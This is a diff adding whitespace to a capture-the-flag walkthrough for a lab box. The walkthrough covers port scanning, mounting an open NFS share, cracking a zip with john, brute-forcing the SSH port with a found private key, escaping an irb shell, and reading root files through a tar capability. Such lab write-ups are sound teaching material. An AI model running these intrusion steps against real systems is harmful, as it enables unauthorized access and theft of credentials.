@@ -18,11 +18,13 @@ do
     nc 10.10.10.10 -p $port
 done
 ```
+
 ### Output of port 12345
 ```
 NFS shares are cool, especially when they are misconfigured
 It's on the standard port, no need for another scan
 ```
+
 ### NFS runs on port 2049
 ```
 command:
@@ -32,27 +34,32 @@ output:
 Export list for 10.10.10.10:
 /home/nfs *
 ```
+
 ### Then just simply mount it
 ```
 sudo mount -t nfs 10.10.0.10:/home/nfs /var/backups
 ```
+
 ### There is a file named backup.zip
 #### But its password protected
 ```
 zip2john backup.zip > hash
 john hash -w ~/wordlists/rockyou.txt
 ```
+
 ### Once you've uncompressed the zip, we can see that it's hades's home directory
 #### Output:
 ```
 authorized_keys  flag.txt  hint.txt  id_rsa  id_rsa.pub
 ```
+
 ### Nice, we have the flag and an id_rsa key
 ##### The problem now is that we don't know which port ssh is running on, lets check the hint.
 ```
 output:
 2500-4500
 ```
+
 ## [Task 2] User.txt
 #### this is probably refering the to range of ports that ssh is running on
 #### lets modify our script
@@ -63,6 +70,7 @@ do
     ssh -i id_rsa hades@10.10.10.10 -p $port
 done
 ```
+
 ### Now we just wait until we get a login prompt
 #### Nice, we have a shell
 ```
@@ -94,11 +102,13 @@ applicable law.
 ```
 irb(main):001:0> system("/bin/bash")
 ```
+
 ### And we have user.txt
 ```
 hades@hell:~$ ls
 user.txt
 ```
+
 ## [Task 3] Root.txt
 #### Now all we have to do is escalate our privs
 #### Looking at the hint, we know that "getcap" has something to do with our escalation.
@@ -108,6 +118,7 @@ hades@hell:~$ getcap -r / 2>/dev/null
 /usr/bin/mtr-packet = cap_net_raw+ep
 /bin/tar = cap_dac_read_search+ep
 ```
+
 ### Looking at the output, we know that /bin/tar has read capabilites
 ##### It took me an embarrassingly long amount of time to realize that we did not have write access to /home/hades
 ##### So we need to do this in /dev/shm
@@ -127,6 +138,7 @@ hades@hell:/dev/shm$ cd root
 hades@hell:/dev/shm/root$ ls
 root.txt
 ```
+
 ## And we've rooted the box, nice
 
 
